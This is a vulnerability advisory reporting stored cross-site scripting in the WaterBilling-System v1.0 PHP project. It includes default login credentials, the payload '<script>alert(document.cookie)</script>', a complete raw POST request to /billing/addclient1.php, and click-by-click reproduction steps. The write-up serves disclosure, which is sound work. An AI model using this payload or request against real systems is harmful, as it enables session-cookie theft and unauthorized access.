# WaterBilling-System v1.0 by itsourcecode.com has Cross-site Scripting (XSS)

Vul_Author: Kai Wang

Login Account:jude
Password:123

vendors: https://itsourcecode.com/free-projects/php-project/billing-system-in-php-with-source-code/

Vulnerability File: /billing/addclient1.php HTTP/1.1

Vulnerability location: /billing/addclient1.php HTTP/1.1

[+] Payload: <script>alert(document.cookie)</script>

Tested on Windows 10, phpStudy

There is an example with alert:
```
POST /billing/addclient1.php HTTP/1.1
Host: 10.12.180.79
Content-Length: 178
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.12.180.79
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.12.180.79/billing/clients.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=d4me9tekbcuef2k8k1qupv9i0t
Connection: close

lname=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&fname=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&mi=M&address=address&contact=test&meterReader=test&add=ADD
```

When you enter the system,click "add client"

![image](https://user-images.githubusercontent.com/56795018/221333339-79de63bb-6abf-4eed-ba3a-3a1aadddcd39.png)

input a XSS script in the lastname input boxes,such as "<script>alert(document.cookie)</script>",it will expose cookie.

![image](https://user-images.githubusercontent.com/56795018/221333584-a8c81a1c-9392-4a6e-b454-1ff1298398c0.png)

click add,and you will obtain its cookie.

![image](https://user-images.githubusercontent.com/56795018/221333611-c7525da2-2448-4d29-8c3e-cf4850c477ab.png)
